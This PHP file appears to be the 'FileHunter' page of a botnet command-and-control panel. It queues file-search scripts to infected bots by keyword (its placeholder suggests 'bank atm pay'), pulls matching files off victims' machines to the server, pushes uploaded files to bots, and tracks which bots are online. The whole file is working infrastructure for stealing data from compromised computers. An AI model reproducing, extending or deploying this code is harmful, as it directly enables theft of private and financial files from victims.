<?php
require 'system/lib/db.php';
require_once 'system/lib/db-gui.php';
require 'system/lib/guiutil.php';
require 'system/lib/shortcuts.php';
require 'system/lib/gui.php';
require_once 'system/lib/shortcuts.php';

if (isset($_GET['ajax'])){
	switch ($_GET['ajax']){
		case 'notes': # Account notes
			if (!mysql_query(mkquery('UPDATE `botnet_rep_filehunter` SET `notes`={s:notes} WHERE `id`={i:id};', $_REQUEST))){
				header('HTTP/1.1 400 AJAX error');
				print mysql_error();
				}
			break;
        case 'mkdownload': // $_REQUEST: botId, f_path
            # Manual download
            if (!filehunter_download_file($_REQUEST['botId'], $_REQUEST['f_path']))
                echo header('HTTP/1.1 400 AJAX error'), mysql_error();
            else
                echo 'Ok';
            break;
		case 'download':
			# Update
			$_REQUEST['job'] = json_encode(array('name' => 'download'));
			$_REQUEST['state'] = 'job';
			if (!mysql_query(mkquery('UPDATE `botnet_rep_filehunter` SET `state`={s:state}, `job`={s:job}, `f_local`=NULL WHERE `id`={i:id};', $_REQUEST))){
				header('HTTP/1.1 400 AJAX error');
				print mysql_error();
				}
			break;
		case 'upload':
			# Download
			if ($_FILES['upload']['error'] > 0)
				die('Upload error #'.$_FILES['upload']['error']);

			$ext = strrchr($_FILES['upload']['name'], '.');
			if ($ext === FALSE)
				$ext = '.dat';
			$target_path = sprintf('public/filehunter/%05d-%s%s', $_REQUEST['id'], uniqid(), $ext);
			$target_url = sprintf('%s://%s/%s/%s', empty($_SERVER['HTTPS'])? 'http' : 'https', $_SERVER['HTTP_HOST'], dirname($_SERVER['SCRIPT_NAME']), $target_path);

			if (!move_uploaded_file($_FILES['upload']['tmp_name'], $target_path))
				die('Upload error: failed to save to '.$target_path);

			# Generate the URL
			# Update
			$_REQUEST['job'] = json_encode(array('name' => 'upload', 'url' => $target_url));
			$_REQUEST['state'] = 'job';
			if (!mysql_q(mkquery('UPDATE `botnet_rep_filehunter` SET `state`={s:state}, `job`={s:job} WHERE `id`={i:id};', $_REQUEST)))
				die();

			header('Location: ?'.mkuri(1, 'm'));
			break;
		#case 'rescan':
		#	add_simple_script($_REQUEST['botId'], 'filehunter:reset:'.date('Ymd_his_u'), 'restart_filesearch');
		#	break;
		case 'search':
			foreach (array('keywords', 'exclude_names', 'exclude_dirs') as $k){
				$a = array();
				foreach (explode("\n", $_REQUEST[$k]) as $l)
					if (strlen($l = trim($l)))
						$a[] = $l;
				$_REQUEST[$k] = implode(';', $a);
				}
			add_simple_script($_REQUEST['botId'], 'filehunter:search:'.date('Ymd_his_u'), "search_file \"{$_REQUEST['keywords']}\" \"{$_REQUEST['exclude_names']}\" \"{$_REQUEST['exclude_dirs']}\"");
			header('Location: ?'.mkuri(1, 'm'));
			break;
		case 'junkbot':
			mysql_q(mkquery('UPDATE `botnet_rep_filehunter` SET `favorite`=-1 WHERE `botId`={s:botId};', $_REQUEST));
			break;
		case 'junk':
			mysql_q(mkquery('UPDATE `botnet_rep_filehunter` SET `favorite`=IF(`favorite`=0, -1, 0) WHERE `id`={i:id};', $_REQUEST));
			break;
		default:
			header('HTTP/1.1 400 Unknown AJAX method');
			break;
		}
	die();
}



ThemeBegin(LNG_MM_SERVICE_FILEHUNTER, 0, getBotJsMenu('botmenu'), 0);

if (mysql_result(mysql_q('SELECT COUNT(*) FROM `botnet_rep_filehunter` WHERE `job` IS NOT NULL'), 0, 0)>0){
	$CRON = include_once 'system/cron.php'; /** @var CronJobsMan $CRON */
	$CRON->manual_run('cronjobs_filehunter::cronjob_file_scripts');
	}

/* ==========[ Recent Scripts ]========== */

echo str_replace(array('{WIDTH}','{COLUMNS_COUNT}','{TEXT}'),array('100%', 1, LNG_SCRIPTS), THEME_LIST_BEGIN.THEME_LIST_TITLE), '<tr id="scripts-collapsible" style="display: none;"><td>';

$R = mysql_q(mkquery(
	'SELECT
		`s`.`id`,
		`s`.`name`,
		`s`.`script_text`,
		`s`.`time_created`,
		`r`.`extern_id` IS NOT NULL AS `executed`,
		MAX(`r`.`type`) AS `status`,
		MAX(`r`.`rtime`) AS `rtime`,
		GROUP_CONCAT(`r`.`report` SEPARATOR " ; ") AS `reports`
	 FROM `botnet_scripts` `s` LEFT JOIN `botnet_scripts_stat` `r` USING(`extern_id`)
	 WHERE
	    `s`.`name` LIKE "filehunter:%" AND
	    (`r`.`extern_id` IS NOT NULL OR (
	        (`r`.`extern_id` IS NULL AND `s`.`time_created` >= {i:notsent_thr}) OR
	        (`r`.`type`=1 AND `r`.`rtime` >= {i:ok_thr}) OR
	        (`r`.`type`>=0 AND `r`.`rtime` >= {i:error_thr}) OR
	        (`r`.`type`=0 AND `r`.`rtime` >= {i:sent_thr})
	        ))
	 GROUP BY `s`.`id`
	 ORDER BY `s`.`time_created` DESC
	 ', array(
	'ok_thr' => time() - 60,
	'error_thr' => time() - 60*60*6,
	'sent_thr' => time() - 60*60*6,
	'notsent_thr' => time() - 60*60*6,
	)
	));

echo '<table id="recent_scripts" class="lined">',
	'<THEAD><tr>',
	'<th>', LNG_SCRIPTS_TH_NAME, '</th>',
	'<th>', LNG_SCRIPTS_TH_SCRIPT, '</th>',
	'<th>', LNG_SCRIPTS_TH_DATE, '</th>',
	'<th>', LNG_SCRIPTS_TH_STATUS, '</th>',
	'</tr></THEAD>';
echo '<TBODY>';
while ($R && !is_bool($r = mysql_fetch_assoc($R))){
	echo '<tr>';
	echo '<th>', '<a href="?m=botnet_scripts&view=', $r['id'], '" target="_blank">', $r['name'], '</a>', '</th>';
	echo '<td>', $r['script_text'], '</td>';
	echo '<td>', timeago(time()-$r['time_created']), '</td>';
	# Status
	echo '<td title="', htmlspecialchars($r['reports']), '">';
	if (!$r['executed'])
		echo LNG_SCRIPTS_STATUS_WAIT;
		else {
		switch($r['status']){
			case 1: echo LNG_SCRIPTS_STATUS_SENT;		break;
			case 2: echo LNG_SCRIPTS_STATUS_EXECUTED;	break;
			default:
				echo LNG_SCRIPTS_STATUS_FAILED, '=', $r['status'], ': ', $r['reports'];
				break;
			}
		echo ', <small>', timeago(time() - $r['rtime']), '</small>';
		}
	echo '</td>';
	echo '</tr>';
	}
echo '</TBODY>';
echo '</table>';

echo '</td></tr>', THEME_LIST_END;

/* ==========[ FileHunter ]========== */

/* Filters */
$Qfilt = array();
foreach (isset($_REQUEST['filter'])? $_REQUEST['filter'] : array() as $f){
    list($name,$val) = explode(':', $f, 2);
    $Qfilt[$name] = $val;
}

if (!empty($Qfilt['search']) && strpos($Qfilt['search'], ':') !== FALSE)
    list($Qfilt['botId'],$Qfilt['search']) = array_map('trim', explode(':', $Qfilt['search']));

$_GET['filter'] = array(); // rebuild it for mkuri()
foreach ($Qfilt as $n => $v)
    $_GET['filter'][] = "$n:$v";
mkuri(null);

$links  = '<ul class="links">';
$links .= '<li><a href="#" class="sel_colorbox" data-sel="#custom_download_form"><img src="theme/images/icons/download.png"> Custom download</a></li>';
$links .= '<li><a href="?m=ajax_config&action=filehunter" class="ajax_colorbox"><img src="theme/images/icons/expand.png"> Auto download</a></li>';
$links .= '</ul>';

$filters  = '<ul class="filters">';
if (!empty($Qfilt['botId']))
    $filters .= '<li><a href="?'.mkuri(1,'m').'&filter[]=botId:'.rawurlencode($Qfilt['botId']).'" class="active">[ BotId: '.htmlentities($Qfilt['botId']).' ]</a>';
$filters .= '<li><a href="?'.mkuri(1,'m').'" '.(array_diff_key($Qfilt, array('search' => ''))? '' : 'class="active"').'>[ Default ]</a>';
$filters .= '<li><a href="?'.mkuri(1,'m').'&filter[]=downloaded:1" '.(isset($Qfilt['downloaded'])? 'class="active"' : '').'>[ Downloaded ]</a> ';
$filters .= '<li><a href="?'.mkuri(1,'m').'&filter[]=onlinebot:1"  '.(isset($Qfilt['onlinebot'])? 'class="active"' : '').'>[ Online ]</a> ';
$filters .= '<li><a href="?'.mkuri(1,'m').'&filter[]=showjunk:1"   '.(isset($Qfilt['showjunk'])? 'class="active"' : '').'>[ +Trash ]</a>';
$filters .= '</ul>';

echo str_replace(array('{WIDTH}','{COLUMNS_COUNT}','{TEXT}'),array('100%', 1, LNG_MATCHED_FILES.$links.$filters), THEME_LIST_BEGIN.THEME_LIST_TITLE), '<tr><td>';

if (!file_exists('public/filehunter'))
    mkdir('public/filehunter', 0777);
if (!is_writable('public'))
    echo '<div class="error">public/ ', LNG_MUST_BE_WRITABLE, '</div>';
if (!is_writable('public/filehunter'))
    echo '<div class="error">public/filehunter ', LNG_MUST_BE_WRITABLE, '</div>';

/* Pager */
if (!isset($_REQUEST['page']))
	$_REQUEST['page'] = 1;
$PAGER = new Paginator($_REQUEST['page'], 200);

/* Search */
$search_filter = null;
if (isset($Qfilt['search'])){
	$search = array();
	foreach (explode(' ', $Qfilt['search']) as $s)
		if (strlen($s = trim($s)))
			$search[] = mkquery(' `f_path` LIKE "%{s=:s}%" ', array('s' => $s));
	$search_filter = implode(' OR ', $search);
}
if (empty($search_filter)) $search_filter = null;

/* Clicksort */
require_once 'system/lib/db-gui.php';
$CLICKSORT = new Clicksort(false);
$CLICKSORT->addField('mtime', '-', '`fh`.`f_mtime`');
$CLICKSORT->addField('updated', '-', '`fh`.`upd`');
$CLICKSORT->config(empty($_GET['sort'])? '' : $_GET['sort'], 'updated-');
$CLICKSORT->render_url('?'.mkuri(0, 'sort').'&sort=');

/* Query */
$R = mysql_q($q = mkquery(
		'SELECT SQL_CALC_FOUND_ROWS
			`fh`.*,
			((UNIX_TIMESTAMP() - `bl`.`rtime_last`) <= {i:botnet_timeout}) AS `bot_online`
		 FROM `botnet_rep_filehunter` `fh`
		 	LEFT JOIN `botnet_list` `bl` ON(`fh`.`botId` = `bl`.`bot_id`)
		 WHERE
		    ({s:filt_botId} IS NULL OR `botId`={s:filt_botId}) AND
		    ({s:filt_showjunk} IS NOT NULL OR `fh`.`favorite`>=0) AND
		    ({s:filt_search} IS NULL OR (   /*`f_path` LIKE "%{s=:filt_search}%"*/  {=:filt_search}   )) AND
		    ({i:filt_downloaded} IS NULL OR `f_local` IS NOT NULL) AND
		    ({i:filt_onlinebot} IS NULL OR `bl`.`rtime_last` >= {i:filt_onlinebot})
		 ORDER BY
		 	'.$CLICKSORT->orderBy().' /*`fh`.`upd` DESC*/, `fh`.`table` DESC, `fh`.`report_id` DESC
		 LIMIT {i:limit}, {i:perpage}
		 	;
		 ', array(
		'botnet_timeout' => $GLOBALS['config']['botnet_timeout'],
		'recent_thr' => time()-60*60*24, # Most recent first
		'filt_botId' => isset($Qfilt['botId'])? trim($Qfilt['botId']) : NULL, # filter:botId
		'filt_showjunk' => isset($Qfilt['showjunk'])? 1 : NULL,
		'filt_search' => $search_filter, #isset($Qfilt['search'])? $Qfilt['search'] : NULL,
		'filt_downloaded' => isset($Qfilt['downloaded'])? 1 : NULL,
		'filt_onlinebot' => isset($Qfilt['onlinebot'])? time()-$GLOBALS['config']['botnet_timeout'] : NULL,
		'limit' => $PAGER->sql_limit[0], 'perpage' => $PAGER->sql_limit[1],
		)));
$PAGER->total(mysql_result(mysql_q('SELECT  FOUND_ROWS();'), 0));

echo '<form id="hunted_files_search" action="?', mkuri(), '&sort=mtime-">',
		'<input name="search" value="', isset($Qfilt['search'])? $Qfilt['search'] : NULL, '" placeholder="A-BOT: bank atm pay" size="100" /> ',
		'<input type="submit" value="Search" />',
		'</form>';
echo named_preset_picker('FileHunter', '#hunted_files_search input[name=search]');

echo '<table id="hunted_files">',
	'<caption>', LNG_FILES_TCAP_FOUND_FILES, $PAGER->items_total, '</caption>',
	'<THEAD><tr>',
		'<th>', LNG_FILES_TH_BOT, '</th>',
		'<th>', LNG_FILES_TH_FILE, '</th>',
		'<th>', $CLICKSORT->field_render('mtime', LNG_FILES_TH_MTIME), '</th>',
		'<th>', LNG_FILES_TH_SIZE, '</th>',
		'<th>', LNG_FILES_TH_STATE, '</th>',
		'<th>', $CLICKSORT->field_render('updated', LNG_FILES_TH_UPDATED), '</th>',
		'<th>', LNG_FILES_TH_JOB, '</th>',
		'<th>', LNG_FILES_TH_NOTES, '</th>',
		'</tr></THEAD>';
echo '<TBODY>';
$prev_bot = null;
while ($R && !is_bool($r = mysql_fetch_assoc($R))){
	$classes = array();
	if ($r['favorite'] == -1) $classes[] = 'junk';
	if ($r['favorite'] ==  1) $classes[] = 'fav';

	if ($r['botId'] !== $prev_bot)
		$classes[] = 'anotherbot';
	$prev_bot = $r['botId'];

	echo '<tr data-href="&id=', $r['id'], '&botId=', rawurlencode($r['botId']), '" class="', implode(' ', $classes), '">';
	# Bot
	echo '<th>',
		'<img width=10 height=10 src="theme/images/icons/', $r['bot_online']?'online':'offline', '.png" /> ',
		 botPopupMenu($r['botId'], 'botmenu'),
		'</th>';
	# File
	$p = max(strrpos($r['f_path'], '/'), strrpos($r['f_path'], '\\'));
	$f_basename = substr($r['f_path'], $p);
	$f_dirname = substr($r['f_path'], 0, $p);


	echo '<td class="file">',
		(!empty($r['f_local'])? '<a href="'.$r['f_local'].'" target="_blank">' :''), # url
		'<span class="path">', $f_dirname, '</span>',
		'<span class="fname">', $f_basename, '</span>',
		'</a>',
		'</td>';
	# Mtime
	echo '<td>', is_null($r['f_mtime'])? '-' : date('d.m.Y', $r['f_mtime']), '</td>';
	# Size
	echo '<td><a href="?m=reports_db&t=', $r['table'], '&id=', $r['report_id'], '" target="_blank" title="', htmlspecialchars(var_export($r['f_hash'],1)), '">', bytesz($r['f_size']), '</a></td>';
	# State
	echo '<td class="state">', $r['state'], '</td>';
	# Date
	echo '<td>', timeago(time()-$r['upd']), '</td>';
	# Job
	$job = is_null($r['job'])? null : json_decode($r['job'],true);
	echo '<td><small>',
		is_null($job)? '-' : '<span title="'.htmlspecialchars($r['job']).'">'.$job['name'].'</span>', '</small></td>';
	# Notes
	echo '<td>',
		'<div class="notes" data-href="&id=', $r['id'], '" contenteditable="true">',
			$r['notes'],
			'</div>',
		'</td>';
	echo '</tr>';
	}
echo '</TBODY>';
echo '</table>';

# Paginator
echo $PAGER->page_count>1 ? $PAGER->jPager3k('?'.mkuri(0,'page').'page=%page%', null, 'paginator') : '';

echo '</td></tr>', THEME_LIST_END;

echo LNG_HINT_CONTEXT_MENU;





$MAX_UPLOAD = ini_get('upload_max_filesize');
echo <<<HTML
<link rel="stylesheet" href="theme/js/contextMenu/src/jquery.contextMenu.css" />
<script src="theme/js/contextMenu/src/jquery.contextMenu.js"></script>
<script src="theme/js/page-svc_filehunter.js"></script>

<div id="fileupload" style="display: none;">
	<form action="?" method="POST" enctype="multipart/form-data">
		<dl>
			<dt class="botId"></dt>
			<dt class="file"></dt>
			<dd><input type="file" name="upload" /><br />&lt;= $MAX_UPLOAD (php.ini: upload_max_filesize) </dd>
			</dl>
		<input type="submit" value="Upload" />
		</form>
	</div>

<div id="filesearch"  style="display: none;">
	<form action="?" method="POST" enctype="multipart/form-data">
		<dl>
			<dt class="botId"></dt>
			<dt>Keywords</dt><dd><textarea rows="5" cols="60" name="keywords"></textarea></dd>
			<dt>Exclude names</dt><dd><textarea rows="5" cols="60" name="exclude_names">*.log;*.jpg;*.gif;*.bat;*.exe;*.png;*.bmp;*.lnk;*.wer;*.css;*.js;*.wpl;*.mp3;*.avi;*.mkv;*.wav;*.info;*.ini;*.dll;*.url;*.menu;*.hfx;*.map;*.lng;*.ico;*.icon;*.aml;*.swf;*.man;*.inf;*.cab;*.flv;*.cat;*.lcp;*.scr;*.xml;*.sys;*.cn_;*.dl_;*.jpeg;*.psd;*.ch_;*.ex_;</textarea></dd>
			<dt>Exclude dirs</dt><dd><textarea rows="5" cols="60" name="exclude_dirs">%wd%;%td%;%sd1%;%sd2%;%pd1%;%pd2%;%ad%;*AppData*;*Local Settings*;*Application Data*;*Temp*;*Cookies*;*Recycle*;*torrent*;*drivers*;*help*;</textarea></dd>
			</dl>
		<input type="submit" value="Search" />
		</form>
	</div>

<div id="custom_download_form" style="display: none;">
    <form action="?m=svc_filehunter&ajax=mkdownload" class="ajax_form_update" method="POST">
		<dl>
			<dt>BotID</dt><dd><input type="text" name="botId" size=100/></dd>
			<dt>File Path</dt><dd><input type="text" name="f_path"  size=100/></dd>
			</dl>
		<input type="submit" value="Download" />
        </form>
    </div>

<script src="theme/js/jPager3k/jPager3k.js"></script>
<link rel="stylesheet" href="theme/js/jPager3k/jPager3k.css">
<link rel="stylesheet" href="theme/js/jPager3k/jPager3k-default.css">
HTML;

echo THEME_DIALOG_END, ThemeEnd();
